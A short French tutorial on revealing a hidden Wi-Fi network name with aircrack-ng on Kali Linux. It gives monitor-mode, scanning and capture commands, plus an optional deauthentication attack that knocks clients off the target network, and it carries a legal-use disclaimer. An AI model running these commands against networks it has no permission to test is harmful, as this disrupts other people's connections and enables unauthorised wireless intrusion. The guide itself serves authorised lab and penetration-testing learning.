# 🕵️‍♂️ Révéler un SSID Caché sous Kali Linux

> ⚠️ **Usage légal uniquement** : Ce guide est destiné à l'apprentissage **sur votre propre réseau Wi-Fi** ou dans un cadre légal (lab, test de pénétration autorisé).

---

## 🎯 Objectif

Révéler le nom (SSID) d’un **réseau Wi-Fi caché** (SSID masqué) en utilisant les outils de la suite `aircrack-ng`.

---

## 🧰 Outils nécessaires

- Kali Linux
- `aircrack-ng` (déjà installé dans Kali)
- Une carte Wi-Fi compatible **mode monitor**

---

## 🛠️ Étapes détaillées

### 1. 📡 Mettre l’interface Wi-Fi en mode **monitor**

```bash
sudo airmon-ng start wlan0

### 2. 🔍 Scanner les réseaux Wi-Fi à proximité
```bash
sudo airodump-ng wlan0mon

### 3. 🎯 Cibler le réseau caché avec son BSSID et canal
```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon

### 4. 👀 Attendre qu’un client se connecte
Dès qu’un client tente de se connecter, le SSID apparaît dans la capture.

### 5. 💥 (Optionnel) Forcer la reconnexion d’un client avec une attaque deauth
Si le SSID n\'apparaît pas
```bash
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

Cela déconnecte les clients → ils se reconnectent → le SSID est révélé.
